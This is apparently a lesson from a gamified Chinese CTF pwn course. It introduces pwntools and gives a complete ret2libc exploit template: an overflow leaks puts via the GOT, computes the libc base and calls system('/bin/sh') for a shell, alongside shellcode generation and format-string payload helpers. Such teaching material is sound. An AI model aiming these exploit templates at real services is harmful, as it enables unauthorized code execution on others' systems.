# 第 26 关 · pwntools：你的游戏手柄

## 🎬 游戏开场

前面我们手动敲命令、手动算偏移、手动拼 payload——就像用键盘一个键一个键地操作游戏。

现在给你一个**游戏手柄**:pwntools。它能:

- 一行连接远程题目(`remote`)
- 一行启动本地程序(`process`)
- 一行生成 shellcode(`shellcraft`)
- 一行打包地址(`p64`)
- 一行自动拼 ROP 链(`ROP`)
- 一行完成格式化字符串利用(`fmtstr_payload`)

它是每个 Pwner 的必备装备。这一关我们把常用按钮全部介绍一遍,让你写 exp 像玩手柄一样顺手。

---

## 🧠 核心概念（游戏版）

### 1. 手柄的开机仪式

```python
from pwn import *        # 导入手柄驱动
context.arch = 'amd64'   # 告诉手柄你玩的是64位游戏机
context.log_level = 'debug'  # 打开详细日志(调试时)
```

### 2. 连接关卡的三个按钮

```python
p = process('./vuln')                    # 启动本地关卡
p = remote('比赛服务器', 10001)          # 连接远程关卡
p = gdb.debug('./vuln', 'break main')    # 启动并挂上gdb透视挂
```

### 3. 收发数据的按钮

```python
p.sendline(data)      # 发一行数据(自动加换行)
p.send(data)          # 发原始数据
p.recv()              # 收数据
p.recvline()          # 收一行
p.recvuntil(b'输入:') # 一直收到某个提示
p.interactive()       # 切换到手动交互(拿shell后用)
```

### 4. 打包/解包地址(小端序助手)

```python
p64(0x401176)   # 把地址打包成8字节(64位) → b'v\x11@\x00...'
u64(b'....')    # 8字节解包成地址
p32(...)  / u32(...)  # 32位版本
```

前面讲过"小端序底朝前放"——`p64` 帮你自动搞定。

### 5. 生成 shellcode

```python
shellcode = asm(shellcraft.amd64.linux.sh())  # 一行生成开shell机器码
print(disasm(shellcode))                       # 反汇编看看
```

### 6. 自动找 gadget、拼 ROP

```python
elf = ELF('./vuln')       # 加载游戏地图
rop = ROP(elf)            # 打开乐高积木箱
print(rop.find_gadget(['pop rdi', 'ret']))  # 找指定积木
rop.system(0x...); payload = rop.chain()    # 自动拼链
```

### 7. 格式化字符串自动化

```python
payload = fmtstr_payload(6, {elf.got['printf']: system_addr})
```

一行生成精妙的 `%n` 写入作弊码,不用手算。

### 8. ELF 分析

```python
elf = ELF('./vuln')
elf.sym['main']     # main函数地址
elf.got['puts']     # puts的GOT表地址
elf.plt['puts']     # puts的PLT地址
libc = ELF('./libc.so.6')
libc.sym['system']  # system在libc里的偏移
```

---

## 🔧 完整 exp 模板(游戏手柄速查)

```python
from pwn import *

# 开机设置
context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')
p = remote('目标', 端口)   # 或 process('./vuln')

# 找零件
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# 第一轮:泄露
p.recvuntil(b'输入:')
p.sendline(b'A'*24 + p64(pop_rdi) + p64(elf.got['puts'])
           + p64(elf.plt['puts']) + p64(elf.sym['main']))
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
base = leak - libc.sym['puts']

# 第二轮:getshell
p.recvuntil(b'输入:')
p.sendline(b'A'*24 + p64(pop_rdi)
           + p64(base + next(libc.search(b'/bin/sh\x00')))
           + p64(base + libc.sym['system']))
p.interactive()
```

---

## 🎯 闯关任务:把手动 exp 改成手柄版

找出你之前手写的第 10 关 ret2libc exp,用 pwntools 的 `ELF`、`ROP`、`fmtstr_payload` 等函数重写一遍。感受手柄带来的效率提升。

---

## 📌 本关小结

| 按钮 | 功能 |
| --- | --- |
| process/remote/gdb.debug | 启动关卡 |
| send/recv/interactive | 收发数据 |
| p64/u64 | 地址打包解包 |
| asm + shellcraft | 生成shellcode |
| ROP + find_gadget | 找积木拼链 |
| fmtstr_payload | 自动格式化利用 |
| ELF | 分析地图文件 |

---

## 🎬 下一关预告

**第 27 关 · gdb:慢动作回放与透视挂**

手柄让你自动化,但当你卡关时,需要"透视挂"看清程序内部到底发生了什么。下一关教你 gdb 的核心操作:打断点、单步执行、看寄存器、看内存、看栈。这是调试漏洞的必备技能。
